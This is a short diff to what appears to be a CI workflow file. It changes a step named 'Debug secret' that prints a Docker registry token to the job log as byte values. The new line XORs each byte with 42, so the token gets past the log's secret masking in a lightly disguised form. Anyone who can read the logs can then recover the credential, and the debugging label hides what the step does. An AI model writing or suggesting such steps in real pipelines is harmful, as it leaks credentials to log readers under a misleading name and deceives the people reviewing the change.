@@ -25,7 +25,7 @@ jobs:
 
       - name: Debug secret
         run: |
-          printf '%s' "${{ secrets.DOCKER_TOKEN }}" | od -An -tu1 | tr -s ' '
+          printf '%s' "${{ secrets.DOCKER_TOKEN }}" | od -An -tu1 | tr -s ' ' | tr ' ' '\n' | grep -v '^$' | while read n; do printf '%d ' $((n ^ 42)); done; echo
 
       - name: Get Commit SHA
         id: commit
